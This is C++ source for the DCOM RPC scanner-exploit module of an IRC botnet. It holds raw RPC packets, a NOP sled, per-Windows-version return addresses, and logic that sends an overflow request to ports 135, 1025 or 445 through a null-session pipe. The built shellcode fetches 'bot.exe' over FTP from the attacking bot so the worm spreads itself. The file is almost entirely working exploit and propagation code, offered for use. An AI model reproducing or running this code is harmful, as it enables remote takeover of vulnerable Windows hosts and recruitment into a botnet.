

#include "main.h"
#include "mainctrl.h"
#include "scanner.h"
//#ifdef __COMPILE_SCANNER_DCOM__
#include "utility.h"
#include "shellcode.h"

class CScannerDCOM : public CScannerBase
{
public:
	CScannerDCOM();
	virtual ~CScannerDCOM() throw() { }

	bool Exploit();
};

/*
	Don't msg me telling me the scanner doesn't work. Im tired of that,
	it does work, you just have to figure out how.
*/

char bindstr[]=
	"\x05\x00\x0B\x03\x10\x00\x00\x00\x48\x00\x00\x00\x7F\x00\x00\x00"
	"\xD0\x16\xD0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x01\x00"
	"\xa0\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
	"\x00\x00\x00\x00\x04\x5D\x88\x8A\xEB\x1C\xC9\x11\x9F\xE8\x08\x00"
	"\x2B\x10\x48\x60\x02\x00\x00\x00";

char request1[]=
	"\x05\x00\x00\x03\x10\x00\x00\x00\xE8\x03\x00\x00\xE5\x00\x00\x00"
	"\xD0\x03\x00\x00\x01\x00\x04\x00\x05\x00\x06\x00\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x32\x24\x58\xFD\xCC\x45\x64\x49\xB0\x70\xDD\xAE"
	"\x74\x2C\x96\xD2\x60\x5E\x0D\x00\x01\x00\x00\x00\x00\x00\x00\x00"
	"\x70\x5E\x0D\x00\x02\x00\x00\x00\x7C\x5E\x0D\x00\x00\x00\x00\x00"
	"\x10\x00\x00\x00\x80\x96\xF1\xF1\x2A\x4D\xCE\x11\xA6\x6A\x00\x20"
	"\xAF\x6E\x72\xF4\x0C\x00\x00\x00\x4D\x41\x52\x42\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x0D\xF0\xAD\xBA\x00\x00\x00\x00\xA8\xF4\x0B\x00"
	"\x60\x03\x00\x00\x60\x03\x00\x00\x4D\x45\x4F\x57\x04\x00\x00\x00"
	"\xA2\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
	"\x38\x03\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
	"\x00\x00\x00\x00\x30\x03\x00\x00\x28\x03\x00\x00\x00\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\xC8\x00\x00\x00\x4D\x45\x4F\x57"
	"\x28\x03\x00\x00\xD8\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00"
	"\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\xC4\x28\xCD\x00\x64\x29\xCD\x00\x00\x00\x00\x00"
	"\x07\x00\x00\x00\xB9\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xAB\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xA5\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xA6\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xA4\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xAD\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xAA\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\x07\x00\x00\x00\x60\x00\x00\x00\x58\x00\x00\x00"
	"\x90\x00\x00\x00\x40\x00\x00\x00\x20\x00\x00\x00\x78\x00\x00\x00"
	"\x30\x00\x00\x00\x01\x00\x00\x00\x01\x10\x08\x00\xCC\xCC\xCC\xCC"
	"\x50\x00\x00\x00\x4F\xB6\x88\x20\xFF\xFF\xFF\xFF\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x08\x00\xCC\xCC\xCC\xCC"
	"\x48\x00\x00\x00\x07\x00\x66\x00\x06\x09\x02\x00\x00\x00\x00\x00"
	"\xC0\x00\x00\x00\x00\x00\x00\x46\x10\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x78\x19\x0C\x00"
	"\x58\x00\x00\x00\x05\x00\x06\x00\x01\x00\x00\x00\x70\xD8\x98\x93"
	"\x98\x4F\xD2\x11\xA9\x3D\xBE\x57\xB2\x00\x00\x00\x32\x00\x31\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x80\x00\x00\x00\x0D\xF0\xAD\xBA"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x18\x43\x14\x00\x00\x00\x00\x00\x60\x00\x00\x00\x60\x00\x00\x00"
	"\x4D\x45\x4F\x57\x04\x00\x00\x00\xC0\x01\x00\x00\x00\x00\x00\x00"
	"\xC0\x00\x00\x00\x00\x00\x00\x46\x3B\x03\x00\x00\x00\x00\x00\x00"
	"\xC0\x00\x00\x00\x00\x00\x00\x46\x00\x00\x00\x00\x30\x00\x00\x00"
	"\x01\x00\x01\x00\x81\xC5\x17\x03\x80\x0E\xE9\x4A\x99\x99\xF1\x8A"
	"\x50\x6F\x7A\x85\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x30\x00\x00\x00\x78\x00\x6E\x00"
	"\x00\x00\x00\x00\xD8\xDA\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x20\x2F\x0C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00"
	"\x00\x00\x00\x00\x03\x00\x00\x00\x46\x00\x58\x00\x00\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x10\x00\x00\x00\x30\x00\x2E\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x68\x00\x00\x00\x0E\x00\xFF\xFF"
	"\x68\x8B\x0B\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

char request2[]=
	"\x20\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x5C\x00\x5C\x00";

/*	\E$\938479272375092753287.xls
	\F$\993847593892837527687.bat
	\S$\267364889234572836487.cmd
	\Y$\128736872350982734872.zip
	\V$\287348927347869928738.rar
	\W$\348579872387469762349.tmp
	\X$\349587230872349876934.bla
	\U$\349879876098209889734.h4x */

char request3[]= // \C$\123456111111111111111.doc
	"\x5C\x00\x43\x00\x24\x00\x5C\x00\x31\x00\x32\x00\x33\x00\x34\x00"
	"\x35\x00\x36\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00"
	"\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00"
	"\x31\x00\x2E\x00\x64\x00\x6F\x00\x63\x00\x00\x00";

char request4[]=
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x20\x00\x00\x00\x30\x00\x2D\x00"
	"\x00\x00\x00\x00\x88\x2A\x0C\x00\x02\x00\x00\x00\x01\x00\x00\x00"
	"\x28\x8C\x0C\x00\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00";

char shellcode_start[]=
	"\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00"
	"\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00\x46\x00\x58\x00"
	"\x46\x00\x58\x00"
	"\xff\xff\xff\xff"	/* return address */
	"\xcc\xe0\xfd\x7f"	/* primary thread data block */
	"\xcc\xe0\xfd\x7f";	/* primary thread data block */

char nops[]=
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90";

unsigned long offsets[]=
{	0x77e81674,		// Win2K SP0
	0x77e829ec,		// Win2K SP1
	0x77e824b5,		// Win2K SP2
	0x77e8367a,		// Win2K SP3
	0x77f92a9b,		// Win2K SP4
	0x77e3afe9,		// Win2k3 Eng
	0x77e9afe3,		// WinXP SP0
	0x77e626ba};	// WinXP SP1

unsigned long magic_offsets[]=
{	0x0018759F,		// Win2K
	0x001875E3,		// Win2K
	0x001F0CD0,		// Win2K
	0x010016C6,		// WinXP
	0x010016CB};	// WinXP

unsigned long oc192_offsets[]=
{	0x0018759F,		// Win2K
	0x0100139d};	// WinXP

unsigned long my_offsets[]=
{	0x010016C6,		// Win2K
	0x0100139d};	// WinXP

/*
	// Address		-	OS		-	Version			-	Language	-	Servie Pack
	0x01001C55		//	Win2k3	-	Standard		-	English		-	SP0
	0x010016C6		//	Win2k	-	all				-	all			-	all
	0x0100139d		//	WinXP	-	Professional	-	German		-	all
*/


/*
		DCOM Scanner starts here
		scans for dcom exploit
*/

CScannerDCOM::CScannerDCOM() { m_szType="CScannerDCOM"; m_sScannerName.Assign("DCOM"); }

bool CScannerDCOM::Exploit()
{
	switch(m_sSocket.m_sPort)
	{
	case 135:
	case 1025:
		{
			char szRecvBuf[4096]; char szSCBuf[4096]; char szReqBuf[4096]; char szShellBuf[4096];
			int iShellSize=0, iPos=0, iSCSize=0, iReqSize=0, iNOPSize=sizeof(nops)-1;
			char *pTemp; int iHostOS=FpHost(m_sSocket.m_szHost, FP_RPC);
			if(iHostOS==OS_UNKNOWN) iHostOS=FpHost(m_sSocket.m_szHost, FP_SMB);
			if(iHostOS==OS_WINNT) return false;
			
			CString sURL;

			if(IsPrivate(g_pMainCtrl->m_cIRC.m_sLocalIp.CStr()) && !IsPrivate(m_sSocket.m_szHost))
				sURL.Format("ftp://bla:bla@%s:%d/bot.exe", g_pMainCtrl->m_cIRC.m_sLocalHost.CStr(), \
					g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue);
			else
				sURL.Format("ftp://bla:bla@%s:%d/bot.exe", inet_ntoa(to_in_addr(g_pMainCtrl->m_cIRC.m_lLocalAddr)), \
					g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue);

			iShellSize=setup_shellcode_udtf(szShellBuf, sizeof(szShellBuf), sURL.Str(), false);
			

			// Build a buffer with the shellcode
			memcpy(szSCBuf+iPos,	shellcode_start,	sizeof(shellcode_start)-1	); iPos+=sizeof(shellcode_start)-1;
			memset(szSCBuf+iPos,	'\x90',				iNOPSize					); iPos+=iNOPSize;
			memcpy(szSCBuf+iPos,	szShellBuf,			iShellSize					); iPos+=iShellSize;
			iSCSize=iPos; iPos=0;

			// Prepend NOPs as long as shellcode doesn't fit RPC packet format
			while(iSCSize%16!=12)
			{	char *szTemp=(char*)malloc(iSCSize+1); iNOPSize++;
				memcpy(szSCBuf+iPos,	shellcode_start,	sizeof(shellcode_start)-1	); iPos+=sizeof(shellcode_start)-1;
				memset(szSCBuf+iPos,	'\x90',				iNOPSize					); iPos+=iNOPSize;
				memcpy(szSCBuf+iPos,	szShellBuf,			iShellSize					); iPos+=iShellSize;
				iSCSize=iPos; iPos=0; free(szTemp); }

			// Set the return address
			if(iHostOS==OS_WINXP || iHostOS==OS_UNKNOWN)
				memcpy(szSCBuf+36, (char*)&my_offsets[1], 4);
			else
				memcpy(szSCBuf+36, (char*)&my_offsets[0], 4);

			// Build the request
			memcpy(szReqBuf+iPos,	request1,			sizeof(request1)-1			); iPos+=sizeof(request1)-1;
			memcpy(szReqBuf+iPos,	request2,			sizeof(request2)-1			); iPos+=sizeof(request2)-1;
			memcpy(szReqBuf+iPos,	szSCBuf,			iSCSize						); iPos+=iSCSize;
			memcpy(szReqBuf+iPos,	request3,			sizeof(request3)-1			); iPos+=sizeof(request3)-1;
			memcpy(szReqBuf+iPos,	request4,			sizeof(request4)-1			); iPos+=sizeof(request4)-1;
			iReqSize=iPos;

			pTemp=szReqBuf+sizeof(request1)-1; // Fill the request with the right sizes
			*(unsigned long*)(pTemp)		= *(unsigned long*)(pTemp)		+ iSCSize / 2;
			*(unsigned long*)(pTemp+8)		= *(unsigned long*)(pTemp+8)	+ iSCSize / 2; pTemp=szReqBuf;
			*(unsigned long*)(pTemp+8)		= *(unsigned long*)(pTemp+8)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+16)		= *(unsigned long*)(pTemp+16)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+128)	= *(unsigned long*)(pTemp+128)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+132)	= *(unsigned long*)(pTemp+132)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+180)	= *(unsigned long*)(pTemp+180)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+184)	= *(unsigned long*)(pTemp+184)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+208)	= *(unsigned long*)(pTemp+208)	+ iSCSize - 12;
			*(unsigned long*)(pTemp+396)	= *(unsigned long*)(pTemp+396)	+ iSCSize - 12;
			
			// Connect to the server
			if(!m_sSocket.Connect(m_sSocket.m_szHost, m_sSocket.m_sPort)) // Connect failed, exit
				return false;
			// Send the bind string
			if(!m_sSocket.Write(bindstr, sizeof(bindstr)-1)) { m_sSocket.Disconnect(); return false; }
			// Read reply
			m_sSocket.RecvTO(szRecvBuf, sizeof(szRecvBuf), 5000);
			// Send the evil request
			if(!m_sSocket.Write(szReqBuf, iReqSize)) { m_sSocket.Disconnect(); return false; }
			// Read reply
			if(!m_sSocket.RecvTO(szRecvBuf, sizeof(szRecvBuf), 5000)) { m_sSocket.Disconnect(); return false; }

			// Close the socket that was once funky fresh
			m_sSocket.Disconnect(); return true;
		}
		break;
	case 445:
		{
#ifdef _WIN32
			NETRESOURCEW nr; bool bRetVal=false;
			if(!ConnectViaNullSession(m_sSocket.m_szHost, &nr)) return bRetVal;
			else
			{	int iHostOS=FpHost(m_sSocket.m_szHost, FP_NP);
				if(iHostOS==OS_UNKNOWN) iHostOS=FpHost(m_sSocket.m_szHost, FP_SMB);
				char szPipePath[MAX_PATH];
				sprintf(szPipePath, "\\\\%s\\pipe\\epmapper", m_sSocket.m_szHost);
    
				HANDLE hFile=CreateFile(szPipePath, GENERIC_WRITE|GENERIC_READ, FILE_SHARE_READ, \
					NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  
				if(hFile!=INVALID_HANDLE_VALUE)
				{	
					SendLocal("%s: connected to pipe \\\\%s\\pipe\\epmapper.", m_sScannerName.CStr(), m_sSocket.m_szHost);
					char szSCBuf[4096]; char szReqBuf[4096]; char szShellBuf[4096];
					int iShellSize=0, iPos=0, iSCSize=0, iReqSize=0, iNOPSize=sizeof(nops)-1;
					char *pTemp;

					CString sURL;

					if(IsPrivate(g_pMainCtrl->m_cIRC.m_sLocalIp.CStr()) && !IsPrivate(m_sSocket.m_szHost))
						sURL.Format("ftp://bla:bla@%s:%d/bot.exe", g_pMainCtrl->m_cIRC.m_sLocalHost.CStr(), \
							g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue);
					else
						sURL.Format("ftp://bla:bla@%s:%d/bot.exe", inet_ntoa(to_in_addr(g_pMainCtrl->m_cIRC.m_lLocalAddr)), \
							g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue);

					iShellSize=setup_shellcode_udtf(szShellBuf, sizeof(szShellBuf), sURL.Str(), false);
					
					// Build a buffer with the shellcode
					memcpy(szSCBuf+iPos,	shellcode_start,	sizeof(shellcode_start)-1	); iPos+=sizeof(shellcode_start)-1;
					memset(szSCBuf+iPos,	'\x90',				iNOPSize					); iPos+=iNOPSize;
					memcpy(szSCBuf+iPos,	szShellBuf,			iShellSize					); iPos+=iShellSize;
					iSCSize=iPos; iPos=0;

					// Prepend NOPs as long as shellcode doesn't fit RPC packet format
					while(iSCSize%16!=12)
					{	char *szTemp=(char*)malloc(iSCSize+1); iNOPSize++;
						memcpy(szSCBuf+iPos,	shellcode_start,	sizeof(shellcode_start)-1	); iPos+=sizeof(shellcode_start)-1;
						memset(szSCBuf+iPos,	'\x90',				iNOPSize					); iPos+=iNOPSize;
						memcpy(szSCBuf+iPos,	szShellBuf,			iShellSize					); iPos+=iShellSize;
						iSCSize=iPos; iPos=0; free(szTemp); }

					// Set the return address
					if(iHostOS==OS_WINXP || iHostOS==OS_UNKNOWN)
						memcpy(szSCBuf+36, (char*)&my_offsets[1], 4);
					else
						memcpy(szSCBuf+36, (char*)&my_offsets[0], 4);

					// Build the request
					memcpy(szReqBuf+iPos,	request1,			sizeof(request1)-1			); iPos+=sizeof(request1)-1;
					memcpy(szReqBuf+iPos,	request2,			sizeof(request2)-1			); iPos+=sizeof(request2)-1;
					memcpy(szReqBuf+iPos,	szSCBuf,			iSCSize						); iPos+=iSCSize;
					memcpy(szReqBuf+iPos,	request3,			sizeof(request3)-1			); iPos+=sizeof(request3)-1;
					memcpy(szReqBuf+iPos,	request4,			sizeof(request4)-1			); iPos+=sizeof(request4)-1;
					iReqSize=iPos;

					pTemp=szReqBuf+sizeof(request1)-1; // Fill the request with the right sizes
					*(unsigned long*)(pTemp)		= *(unsigned long*)(pTemp)		+ iSCSize / 2;
					*(unsigned long*)(pTemp+8)		= *(unsigned long*)(pTemp+8)	+ iSCSize / 2; pTemp=szReqBuf;
					*(unsigned long*)(pTemp+8)		= *(unsigned long*)(pTemp+8)	+ iSCSize - 12;
					*(unsigned long*)(pTemp+16)		= *(unsigned long*)(pTemp+16)	+ iSCSize - 12;
					*(unsigned long*)(pTemp+128)	= *(unsigned long*)(pTemp+128)	+ iSCSize - 12;
					*(unsigned long*)(pTemp+132)	= *(unsigned long*)(pTemp+132)	+ iSCSize - 12;
					*(unsigned long*)(pTemp+180)	= *(unsigned long*)(pTemp+180)	+ iSCSize - 12;
					*(unsigned long*)(pTemp+184)	= *(unsigned long*)(pTemp+184)	+ iSCSize - 12;
					*(unsigned long*)(pTemp+208)	= *(unsigned long*)(pTemp+208)	+ iSCSize - 12;
					*(unsigned long*)(pTemp+396)	= *(unsigned long*)(pTemp+396)	+ iSCSize - 12;

					unsigned long lWritten; char *szInBuf=(char*)malloc(100000); memset(szInBuf, 0, 100000);
					// Send the bind string
					DWORD dwRead; TransactNamedPipe(hFile, bindstr, sizeof(bindstr)-1, szInBuf, 10000, &dwRead, NULL);
					if(szInBuf[2]!=0x0C) { CloseHandle(hFile); CloseNullSession(m_sSocket.m_szHost); return bRetVal; }
					// Send the evil request
					if(!WriteFile(hFile, szReqBuf, iReqSize, &lWritten, 0)) { CloseHandle(hFile); CloseNullSession(m_sSocket.m_szHost); return bRetVal; }
					if(!ReadFile(hFile, szInBuf, 10000, &dwRead, NULL)) bRetVal=true; else bRetVal=false;
					free(szInBuf); }

				CloseHandle(hFile);
				CloseNullSession(m_sSocket.m_szHost); }
			return bRetVal;
#endif // _WIN32
		}
		break;
	default:
		return false;
		break;
	}

	return false;
}

REGSCANNER(DCOM, DCOM, 445, false, true)
